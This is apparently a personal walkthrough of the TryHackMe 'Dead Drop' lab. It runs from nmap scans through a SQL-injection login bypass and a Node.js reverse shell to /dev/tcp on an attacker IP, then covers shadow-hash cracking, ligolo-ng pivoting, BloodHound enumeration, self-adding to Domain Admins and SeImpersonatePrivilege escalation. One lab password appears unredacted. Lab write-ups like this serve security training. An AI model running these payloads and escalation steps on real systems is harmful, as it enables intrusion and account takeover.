---
lab: "Dead Drop"
date: "2026-09-20"
platform: "TryHackMe"
difficulty: "Medium"
---
# Room link: https://tryhackme.com/room/dead-drop

![](../Attachments/Pasted%20image%2020260923031043.png)

![](Pasted%20image%2020260920171812.png)

# DMZ - WebServer

```bash
# NMAP SCAN 
$ sudo nmap -sCV 192.168.11.200

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8f:e0:99:12:94:f0:f0:9e:d7:84:dd:71:79:1a:65:c8 (ECDSA)
|_  256 09:9b:6f:0f:4e:33:80:37:23:62:24:9e:34:7a:2b:4a (ED25519)
80/tcp closed http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### WebServer homepage

![](Pasted%20image%2020260920171826.png)

Login page was bypassed using `SQL Injection`.

Payload:
- Username: `' OR 1=1--`
- Password: `anycharacter`

I'm logged in as `admin` and it looks like a file upload page. 

![](Pasted%20image%2020260920171841.png)

 Usually, if an upload feature on a web application is not properly secured, it could lead to `Remote Code Execution`. 
 
 I created a `PHP reverse shell` from `revshells.com` and tried to upload it. 

![](../Attachments/Pasted%20image%2020260921140510.png)

The problem is that I can't find the exact path of it. I tried authenticated fuzzing using the `connect.sid` cookie but did not find anything.

![](../Attachments/Pasted%20image%2020260921140603.png)

Wappalyzer shows that this website's backend is `Node.js`, so instead of `PHP`, I will use a `javascript reverse shell`.

![](../Attachments/Pasted%20image%2020260921140709.png)

Setup a listener on my `attack machine`.

```bash
$ nc -lvnp 9001  
listening on [any] 9001 ...

```

Then upload the `Javascript Payload`. But nothing happened. I tried a little modification on the reverse shell because I learned that `OpenBSD netcat` removed `-e` for security reason as it was considered a vector for unintended RCE.

This will be the modified payload. 

```bash
require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.21.31/9001 0>&1"')
```

Once Uploaded, I click the `preview` functionality on the website.

![](../Attachments/Pasted%20image%2020260921142640.png)

After that, I got shell access.

```bash
$ nc -lvnp 9001   
listening on [any] 9001 ...
connect to [192.168.21.31] from (UNKNOWN) [192.168.11.200] 42454
bash: cannot set terminal process group (587): Inappropriate ioctl for device
bash: no job control in this shell
node@tryhackme-2404:/opt/app$ 

```

```bash
node@tryhackme-2404:/opt/app$ whoami
node
node@tryhackme-2404:/opt/app$ id
uid=996(node) gid=996(node) groups=996(node)
```

Files in `Node's directory`.

```bash
node@tryhackme-2404:/opt/app$ ls -la
total 100
drwxr-xr-x   8 node node  4096 May  9 05:44 .
drwxr-xr-x   3 root root  4096 May  9 05:44 ..
-rw-r--r--   1 node node  7174 May  9 05:44 app.js
drwxr-xr-x   2 node node  4096 May  9 05:44 backup
drwxr-xr-x   2 node node  4096 May  9 05:44 db
drwxr-xr-x 131 node node  4096 May  9 05:44 node_modules
-rw-r--r--   1 node node 56703 May  9 05:44 package-lock.json
-rw-r--r--   1 node node   335 May  9 05:44 package.json
drwxr-xr-x   2 node node  4096 May  9 05:44 public
drwxr-xr-x   2 node node  4096 Sep 21 06:25 uploads
drwxr-xr-x   2 node node  4096 May  9 05:44 views

```

`backup` and `db` will always be the priority because it could contain sensitive information.

###### Backup

```bash
node@tryhackme-2404:/opt/app/backup$ ls
shadow.bak
node@tryhackme-2404:/opt/app/backup$ file shadow.bak 
shadow.bak: ASCII text
node@tryhackme-2404:/opt/app/backup$ cat shadow.bak 
svc-drop:{REDACTED}:19700:0:99999:7:::
```

I check `/etc/passwd` to confirm that `svc-drop` is a machine user.

```bash
node@tryhackme-2404:/opt/app/backup$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

<SNIP>

node:x:996:996::/home/node:/usr/sbin/nologin
svc-drop:x:1001:1001::/home/svc-drop:/bin/bash

```

That confirms it. It looks like the `shadow.bak` is the one from `/etc/shadow` which can only be access by `root`. With that in hand, we can do what's called `unshadow`. 

To be able to do that you need two things:

- Entry from `/etc/shadow`
- Entry from `/etc/passwd`

```bash
$ cat svcpasswd
svc-drop:x:1001:1001::/home/svc-drop:/bin/bash

$ cat svcshadow
svc-drop:{REDACTED}:19700:0:99999:7:::
```

Look at the `$` prefix:

- `$1$` = MD5
- `$2$` = Blowfish
- `$5$` = SHA-256
- `$6$` = SHA-512

It is important to identify what type of hash it is because we need to get the `hashcat mode ID` for it to work.

![](../Attachments/Pasted%20image%2020260921144108.png)

```bash
$ unshadow svcpasswd svcshadow > shadow.hash

$ hashcat -m 1800 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

svc-drop:{REDACTED}:{REDACTED} # <- password

Session..........: hashcat
Status...........: Cracked
```

###### Database

```bash
node@tryhackme-2404:/opt/app/db$ dir
deaddrop.db
node@tryhackme-2404:/opt/app/db$ file deaddrop.db 
deaddrop.db: SQLite 3.x database, last written using SQLite version 3045003, file counter 3, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 3

```

Here it contains an `SQLite database file`. I exfiltrated it back to my `attack machine` to see what's in there.

```bash
$ sqlite3 deaddrop.db

sqlite> .tables
users

sqlite> select * from users;
╭────┬────────────┬───────────────────╮
│ id │  username  │     password      │
╞════╪════════════╪═══════════════════╡
│  1 │ admin      │ {REDACTED}        │
│  2 │ svc-backup │ {REDACTED}        │
╰────┴────────────┴───────────────────╯

```

Looks like a `credential` for something but definitely not in the linux machine because `/etc/passwd` doesn't have `admin` user on it.

###### SVC-DROP shell

```bash
svc-drop@tryhackme-2404:~$ ls
backup
svc-drop@tryhackme-2404:~$ cd backup
svc-drop@tryhackme-2404:~/backup$ ls -la
total 6252
drwxr-xr-x 2 svc-drop svc-drop    4096 May  9 05:44 .
drwxr-x--- 5 svc-drop svc-drop    4096 Sep 21 07:38 ..
-rw-r--r-- 1 svc-drop svc-drop 6392031 May  9 05:44 deaddrop-mobile.apk
svc-drop@tryhackme-2404:~/backup$ file deaddrop-mobile.apk 
deaddrop-mobile.apk: Android package (APK), with APK Signing Block

```

There is an `APK file` on `svc-drop` directory. I can unzip it because technically, `APKs` are just zip files bundled together.

```bash
$ unzip deaddrop-mobile.apk -d deaddrop-mobile 
Archive:  deaddrop-mobile.apk
  inflating: deaddrop-mobile/DebugProbesKt.bin  
 extracting: deaddrop-mobile/META-INF/androidx.activity_activity.version  
 extracting: deaddrop-mobile/META-INF/androidx.annotation_annotation-experimental.version  
 extracting: deaddrop-mobile/META-INF/androidx.appcompat_appcompat-resources.version  
 extracting: deaddrop-mobile/META-INF/androidx.appcompat_appcompat.version  
  inflating: deaddrop-mobile/META-INF/androidx.arch.core_core-runtime.version  
 extracting: deaddrop-mobile/META-INF/androidx.cardview_cardview.version  
 extracting: deaddrop-mobile/META-INF/androidx.coordinatorlayout_coordinatorlayout.version  
 extracting: deaddrop-mobile/META-INF/androidx.core_core-ktx.version  
 extracting: deaddrop-mobile/META-INF/androidx.core_core.version  

<SNIP>
```

It's too crazy for me to scrub this through strings so I used a program called `JADX` and open the `APK` file there.

![](../Attachments/Pasted%20image%2020260921161411.png)

Research says `com` is where the `App's logic`, `Package Heirarchy` located.

![](../Attachments/Pasted%20image%2020260921162659.png)

I understand they are in the same subnet but I want to make sure I have a clean path towards the internal hosts. I setup `ligolo-ng`. 

Problem is that the subnet is in the `VPN` interface so I rebuilt it. I only linked the `DMZ` on the `tun0`.

```bash
$ sudo ip r del 192.168.11.0/24 via 192.168.21.1 dev tun0 metric 1000

$ sudo ip r add 192.168.11.200/32 via 192.168.21.1 dev tun0 metric 1000

```

##### LIGOLO

```bash
ligolo-ng » interface_create --name deaddrop
INFO[0128] Creating a new deaddrop interface...

ligolo-ng » route_add --name deaddrop --route 192.168.11.0/24
INFO[0150] Route created. 

ligolo-ng » session
? Specify a session : 1 - svc-drop@tryhackme-2404 - 192.168.11.200:47588 - 06ffca581435

[Agent : svc-drop@tryhackme-2404] » tunnel_start --tun deaddrop
INFO[0175] Starting tunnel to svc-drop@tryhackme-2404 (06ffca581435) 

```

##### DEADDROP-DC

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: deaddrop.loc, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEADDROP-DC.deaddrop.loc
| Not valid before: 2026-05-10T06:08:15
|_Not valid after:  2026-11-09T06:08:15
|_ssl-date: 2026-09-21T08:44:43+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DEADDROP
|   NetBIOS_Domain_Name: DEADDROP
|   NetBIOS_Computer_Name: DEADDROP-DC
|   DNS_Domain_Name: deaddrop.loc
|   DNS_Computer_Name: DEADDROP-DC.deaddrop.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-21T08:44:04+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DEADDROP-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

##### DEADDROP-WRK

```bash
$ sudo nmap -sCV 192.168.11.51 -p- --min-rate 3000 -T4 -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 16:46 +0800
Nmap scan report for 192.168.11.51
Host is up.
All 65535 scanned ports on 192.168.11.51 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.31 seconds
```

`RDP` doesn't work on the `Domain controller`. It's weird because `netexec rdp` shows that `j.harris` is a valid credential. I was planning to login through `RDP` and run `SharpHound` to enumeration objects within the `AD`. 

Good thing is we can run `bloodhound` remotely.

```bash
$ sudo bloodhound-python -d deaddrop.loc -u j.harris -p '{REDACTED}' -ns 192.168.11.100 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: deaddrop.loc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (deaddrop-dc.deaddrop.loc:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: deaddrop-dc.deaddrop.loc
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: deaddrop-dc.deaddrop.loc
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DEADDROP-WRK.deaddrop.loc
INFO: Querying computer: DEADDROP-DC.deaddrop.loc
INFO: Done in 01M 24S

```

##### Bloodhound 

![](../Attachments/Pasted%20image%2020260921175219.png)

`J.HARRIS` can add any member to these groups. That's crazy because I can basically create a user and add it as `Domain Admins` or add `J.HARRIS` if it's not part of it yet. The only problem is I need to get shell access on it. 

I decided to look into `SMB shares` since `Port 445` is open.

```bash
$ smbmap -H 192.168.11.100 -u 'j.harris' -p 'DropsOfJupiter2026!' -d 'deaddrop.loc'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.11.100:445      Name: 192.168.11.100            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 

```

Now check contents of each share.

##### NETLOGON SHARE

```bash
[+] IP: 192.168.11.100:445      Name: 192.168.11.100            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        ./NETLOGON
        dr--r--r--                0 Mon May 11 14:03:35 2026    .
        dr--r--r--                0 Mon May 11 14:03:35 2026    ..
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                               
```

##### IPC$ SHARE

```powershell
[+] IP: 192.168.11.100:445      Name: 192.168.11.100            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        ./IPC$
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 08:03:52 1600    lsass
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    scerpc
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-364-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    epmapper
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-1c4-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    eventlog
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-484-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    atsvc
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    TermSrv_API_service
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    Ctx_WinStation_API_service
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-634-0
        fr--r--r--                4 Sun Dec 31 08:03:52 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-264-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    SessEnvPublicRpc
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-264-1
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-83c-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    RpcProxy\49674
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    76fca82155acd5da
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    RpcProxy\593
        fr--r--r--                4 Sun Dec 31 08:03:52 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    spoolss
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-a44-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    netdfs
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-250-0
        fr--r--r--                3 Sun Dec 31 08:03:52 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-300-0
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 08:03:52 1600    Winsock2\CatalogChangeListener-788-0
```

##### SYSVOL SHARE

```bash
[+] IP: 192.168.11.100:445      Name: 192.168.11.100            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        ./SYSVOL
        dr--r--r--                0 Mon May 11 14:03:35 2026    .
        dr--r--r--                0 Mon May 11 14:03:35 2026    ..
        dr--r--r--                0 Mon May 11 14:03:35 2026    deaddrop.loc
[*] Closed 1 connections 
```

That's interesting. Dig deeper! 

```bash
[+] IP: 192.168.11.100:445      Name: 192.168.11.100            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        ./SYSVOLdeaddrop.loc
        dr--r--r--                0 Mon May 11 14:04:45 2026    .
        dr--r--r--                0 Mon May 11 14:04:45 2026    ..
        dr--r--r--                0 Mon Sep 21 17:07:07 2026    DfsrPrivate
        dr--r--r--                0 Mon May 11 14:03:35 2026    Policies
        dr--r--r--                0 Mon May 11 14:03:35 2026    scripts
[*] Closed 1 connections                                                  
```

Download everything and see what I'm dealing with.

```bash
$ smbclient //192.168.11.100/SYSVOL -U 'j.harris' -p '{REDACTED}'

<SNIP> 

$ tree .
.
├── DfsrPrivate
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

16 directories, 5 files

```

Unfortunately, this doesn't have anything that I can use.

I tried to use `j.harris` credentials to `evil-winrm` and `RDP` but no luck. I'm really stuck at this point. It took 2 days to discover a tool.

`IMPACKET-NET`

![](../Attachments/Pasted%20image%2020260923013825.png)

On this page, it breaks down how to do every step and this one is what I needed.

![](../Attachments/Pasted%20image%2020260923013958.png)

```bash
$ impacket-net deaddrop.loc/j.harris:'{REDACTED}'@192.168.11.100 group -name "Domain Admins" -join j.harris
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Adding user account 'j.harris' to group 'Domain Admins'

$ impacket-net deaddrop.loc/j.harris:'{REDACTED}'@192.168.11.100 group -name "Domain Admins"
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

  1. Administrator
  2. j.harris
  3. ITSupport-Admins
```

I also added it to `Remote Desktop Users` group for RDP access

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
deaddrop\j.harris
PS C:\Windows\system32> hostname
DEADDROP-DC
```

Here is `j.harris privileges` on the machine. 

```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled # <- POTATO
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

I got `DC MACHINE ACCOUNT` using `SweetPotate.exe` because of the `SeImpersonatePrivilege`. This allowed me to browse `Administrator` directory and get the flag.

![](../Attachments/Pasted%20image%2020260923015142.png)

```powershell
C:\Users\Administrator\Desktop>
{REDACTED}
```